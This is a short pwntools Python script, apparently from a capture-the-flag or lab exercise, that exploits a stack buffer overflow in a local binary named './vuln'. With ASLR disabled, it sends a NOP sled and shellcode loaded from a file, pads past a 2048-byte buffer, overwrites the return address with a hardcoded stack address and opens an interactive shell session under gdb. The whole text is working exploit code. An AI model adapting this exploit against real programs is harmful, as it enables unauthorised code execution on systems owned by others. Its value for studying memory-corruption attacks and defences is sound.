#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN
context.aslr = False
elf = ELF(BIN)


shellcode = asm("nop") * 1000 + open("asmcode", "rb").read()
io = process(BIN)
gdb.attach(io, '''start''')

# First part: inject
payload = b""
payload += shellcode
payload += b"A" * (2048 + 8 - len(payload)) 
payload += p64(0x7fffffffe450 + 150 - 0x800)


io.send(payload)
io.interactive()
